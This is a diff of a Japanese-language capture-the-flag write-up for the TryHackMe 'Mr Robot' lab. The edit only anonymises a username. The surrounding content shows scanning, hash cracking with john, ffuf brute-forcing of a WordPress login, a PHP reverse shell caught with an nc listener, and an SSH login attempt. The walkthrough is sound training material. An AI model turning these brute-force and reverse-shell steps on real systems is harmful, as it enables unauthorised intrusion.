@@ -27,7 +27,7 @@
     </div>
     
     <article class="writeup-body">
-      <pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+      <pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~]
 └─$ nmap 10.48.189.70 -p- -sCV -T4 
 Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-27 14:22 +0900
 Nmap scan report for 10.48.189.70
@@ -64,7 +64,7 @@ Nmap done: 1 IP address (1 host up) scanned in 178.26 seconds
 <code>fsocity.dic</code>と<code>key-1-of-3.txt</code></p>
 <p>wpscanの結果バージョンは<code>4.3.1</code>であると特定<br>
 wpscanの結果を貼っておく</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/mrRobot]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/tryhackme/mrRobot]
 └─$ wpscan --url http://10.48.163.213                             
 _______________________________________________________________
          __          _______   _____
@@ -153,54 +153,54 @@ Interesting Finding(s):
 [+] Memory used: 261.746 MB
 [+] Elapsed time: 00:20:53
 
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/mrRobot]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/mrRobot]
 └─$ 
 
 </code></pre>
 <p>feroxの結果から（まだ途中だけど）<br>
 /admin/robotっていうのが怪しいと思ったのでアクセスしたらrobot.gzをDLさせられた</p>
 <p>まずgunzipしようとしたら違うファイルだった</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/mrrobot]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/tryhackme/mrrobot]
 └─$ gunzip robot.gz
 
 gzip: robot.gz: not in gzip format
 
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/mrrobot]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/mrrobot]
 └─$ file robot.gz                                     
 robot.gz: bzip2 compressed data, block size = 900k
 </code></pre>
 <p>つぎにbunzip2したらtarアーカイブが出てきた</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/mrrobot]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/tryhackme/mrrobot]
 └─$ bunzip2 robot.gz                   
 bunzip2: Can't guess original name for robot.gz -- using robot.gz.out
 
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/mrrobot]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/mrrobot]
 └─$ ls
 fsociety  inform  join  prepare  question  robot.gz.out  wakeup
 
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/mrrobot]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/mrrobot]
 └─$ file robot.gz.out 
 robot.gz.out: POSIX tar archive (GNU)
 
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/mrrobot]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/mrrobot]
 └─$ 
 </code></pre>
 <p>tarを展開したらhtmlサイトのセットが出てきた</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/mrrobot]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/tryhackme/mrrobot]
 └─$ tar -xf robot.gz.out                          
 
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/mrrobot]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/mrrobot]
 └─$ ls
 fsociety  inform  join  prepare  question  robot.com  robot.gz.out  wakeup
 
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/mrrobot]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/mrrobot]
 └─$ ls robot.com     
 audio  css  images  index.html  intro.webm  js  robots.txt  video
 
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/mrrobot]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/mrrobot]
 └─$ cd robot.com               
 
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/mrrobot/robot.com]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/mrrobot/robot.com]
 └─$ cat robots.txt 
 # robotstxt.org/
 
@@ -214,7 +214,7 @@ Disallow:
 ってことはmd5で<br>
 これをjohnで解析？<br>
 ワードリストにさっきのやつを使う</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/mrrobot]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/tryhackme/mrrobot]
 └─$ john hash.txt --wordlist=fsocity.dic --format=Raw-MD5
 Using default input encoding: UTF-8
 Loaded 1 password hash (Raw-MD5 [MD5 512/512 AVX512BW 16x3])
@@ -232,7 +232,7 @@ admin:adminではusernameが違うとのエラーが出た<br>
 存在するusernameを入れたら違うエラー文言が出そうだ</p>
 <p><code>/fsocity.dic</code>に入っていたデータをワードリストとして<code>ffuf</code>した<br>
 パスワードは<code>test</code>で固定している</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/mrrobot]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/tryhackme/mrrobot]
 └─$   ffuf -u http://10.48.163.213/wp-login.php -X POST \
     -H &quot;Content-Type: application/x-www-form-urlencoded&quot; \
     -b &quot;wordpress_test_cookie=WP Cookie check&quot; \
@@ -254,7 +254,7 @@ ________________________________________________
 
  :: Method           : POST
  :: URL              : http://10.48.163.213/wp-login.php
- :: Wordlist         : FUZZ: /home/rkametani/tryhackme/mrrobot/fsocity.unique.dic
+ :: Wordlist         : FUZZ: /home/kali/tryhackme/mrrobot/fsocity.unique.dic
  :: Header           : Content-Type: application/x-www-form-urlencoded
  :: Header           : Cookie: wordpress_test_cookie=WP Cookie check
  :: Data             : log=FUZZ&amp;pwd=test&amp;wp-submit=Log+In&amp;testcookie=1
@@ -274,7 +274,7 @@ elliot                  [Status: 200, Size: 3651, Words: 144, Lines: 59, Duratio
 <p><code>ELLIOT</code>,<code>Elliot</code>,<code>elliot</code>のときに普段と異なるエラーが出た</p>
 <p>つぎはusernameを<code>elliot</code>に固定してパスワードを探す<br>
 ワードリストは<code>/fsocity.dic</code>から得たワードリストを指定する</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/mrrobot]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/tryhackme/mrrobot]
 └─$   ffuf -u http://10.48.163.213/wp-login.php -X POST \          
     -H &quot;Content-Type: application/x-www-form-urlencoded&quot; \
     -b &quot;wordpress_test_cookie=WP Cookie check&quot; \
@@ -296,7 +296,7 @@ ________________________________________________
 
  :: Method           : POST
  :: URL              : http://10.48.163.213/wp-login.php
- :: Wordlist         : FUZZ: /home/rkametani/tryhackme/mrrobot/fsocity.unique.dic
+ :: Wordlist         : FUZZ: /home/kali/tryhackme/mrrobot/fsocity.unique.dic
  :: Header           : Content-Type: application/x-www-form-urlencoded
  :: Header           : Cookie: wordpress_test_cookie=WP Cookie check
  :: Data             : log=elliot&amp;pwd=FUZZ&amp;wp-submit=Log+In&amp;testcookie=1
@@ -475,7 +475,7 @@ function printit ($string) {
 ?&gt;
 </code></pre>
 <p>うまくいった</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/mrrobot]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/tryhackme/mrrobot]
 └─$ nc -lvnp 4444               
 listening on [any] 4444 ...
 connect to [192.168.205.211] from (UNKNOWN) [10.48.169.47] 60004
@@ -511,7 +511,7 @@ daemon@ip-10-48-169-47:/$
 </code></pre>
 <p><code>robot</code>と<code>ubuntu</code>というユーザーの存在を見つけた<br>
 sshログイン試行してみる</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/mrrobot]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/tryhackme/mrrobot]
 └─$ ssh robot@10.48.169.47                     
 The authenticity of host '10.48.169.47 (10.48.169.47)' can't be established.
 ED25519 key fingerprint is: SHA256:2L45IgzWFbT9Xf8lPZ+yMxT4KfcGcCEIaokbWu9iMi8
